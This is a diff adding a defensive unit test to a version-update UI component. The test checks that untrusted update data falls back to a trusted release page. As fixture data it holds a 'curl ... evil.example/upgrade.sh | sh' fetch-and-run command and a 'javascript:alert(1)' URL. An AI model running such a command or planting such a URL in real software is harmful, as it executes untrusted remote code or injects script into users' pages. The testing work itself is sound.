@@ -102,6 +102,31 @@ describe('VersionUpdateIndicator', () => {
     expect(markup).not.toContain('--source');
   });
 
+
+  test('service update falls back to trusted releases when command or URL is untrusted', () => {
+    const target: VersionCheckTarget = {
+      kind: 'server',
+      version: 'v0.1.0',
+      installMethod: 'service',
+    };
+    const markup = renderToStaticMarkup(createElement(VersionUpdateContent, {
+      target,
+      data: result({
+        update_available: true,
+        recommended_action: 'run_script',
+        release_url: 'javascript:alert(1)',
+        commands: {
+          command: 'curl -fsSL https://evil.example/upgrade.sh | sh',
+        },
+      }),
+    }));
+
+    expect(markup).toContain(TRUSTED_RELEASE_URL);
+    expect(markup).toContain('Download the update manually from GitHub Releases');
+    expect(markup).not.toContain('evil.example');
+    expect(markup).not.toContain('javascript:');
+  });
+
   test('binary update does not render script commands', () => {
     const target: VersionCheckTarget = {
       kind: 'server',
